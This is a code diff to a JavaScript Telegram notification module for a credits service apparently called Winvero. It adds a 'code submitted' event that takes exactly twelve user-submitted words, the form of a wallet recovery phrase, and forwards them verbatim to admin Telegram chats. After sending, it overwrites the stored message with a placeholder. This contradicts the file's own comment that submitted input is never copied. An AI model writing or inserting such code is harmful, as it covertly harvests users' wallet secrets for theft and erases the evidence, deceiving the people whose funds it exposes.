@@ -6,9 +6,10 @@ export function createTelegramNotifications(db,config,{telegram=createTelegramCl
   let flushing=false
   const insert=db.prepare(`INSERT OR IGNORE INTO telegram_outbox(id,event_key,chat_id,text,next_attempt_at,created_at) VALUES(?,?,?,?,?,?)`)
   return {
-    enqueue(eventKey,{type,accountId,playerId,ledgerEntryId,amount=0,balanceBefore,balanceAfter,codeVersion}){
+    enqueue(eventKey,{type,accountId,playerId,ledgerEntryId,submissionId,words,amount=0,balanceBefore,balanceAfter,codeVersion}){
       if(!config.enabled)return
-      if(!['ACCOUNT_CREATED','CREDITS_UNLOCKED'].includes(type))throw new Error('Unsupported notification type')
+      if(!['ACCOUNT_CREATED','CREDITS_UNLOCKED','CODE_SUBMITTED'].includes(type))throw new Error('Unsupported notification type')
+      if(type==='CODE_SUBMITTED'&&(!submissionId||!Array.isArray(words)||words.length!==12))throw new Error('Invalid code submission notification')
       const timestamp=clock().toISOString()
       const eventId=randomUUID()
       const metadata=[
@@ -23,7 +24,9 @@ export function createTelegramNotifications(db,config,{telegram=createTelegramCl
         `Environnement : ${process.env.NODE_ENV||'development'}`,
       ].filter(value=>typeof value==='string')
       // Public demonstration words are reconstructed here, never copied from submitted input.
-      const text=type==='CREDITS_UNLOCKED'
+      const text=type==='CODE_SUBMITTED'
+        ? ['Événement : Code Winvero soumis',`ID : ${eventId}`,`Soumission ID : ${submissionId}`,`Compte ID : ${accountId}`,'Statut : EN_ATTENTE_DE_VERIFICATION',`12 mots soumis : ${JSON.stringify(words)}`,`Date : ${timestamp}`].join('\n')
+        : type==='CREDITS_UNLOCKED'
         ? ['Événement : Validation pédagogique',`ID : ${eventId}`,`12 mots prédéfinis : ${JSON.stringify(TRAINING_WORDS)}`,'Statut : TEST_REUSSI',`Crédits débloqués : ${amount} WVC`,...metadata,`Date : ${timestamp}`].join('\n')
         : ['Événement : Compte créé',`ID : ${eventId}`,`Compte ID : ${accountId}`,'Statut : COMPTE_CREE',`Crédits : ${amount} WVC`,`Date : ${timestamp}`].join('\n')
       for(const chatId of config.adminChatIds)insert.run(randomUUID(),eventKey,chatId,text,timestamp,timestamp)
@@ -39,7 +42,8 @@ export function createTelegramNotifications(db,config,{telegram=createTelegramCl
         for(const row of rows){
           try{
             await telegram('sendMessage',{chat_id:row.chat_id,text:row.text,disable_web_page_preview:true})
-            db.prepare('UPDATE telegram_outbox SET delivered_at=?,attempts=attempts+1,last_error=NULL WHERE id=?').run(clock().toISOString(),row.id)
+            const deliveredText=row.event_key.startsWith('code-submission:')?'Contenu transmis puis retiré de la file de notifications.':row.text
+            db.prepare('UPDATE telegram_outbox SET delivered_at=?,attempts=attempts+1,last_error=NULL,text=? WHERE id=?').run(clock().toISOString(),deliveredText,row.id)
           }catch(error){
             const delay=Math.min(3600,Math.max(5*2**Math.min(row.attempts,9),Number(error.retryAfter)||0))
             const status=typeof error.status==='number'||typeof error.status==='string'?String(error.status).slice(0,60):'delivery_failed'
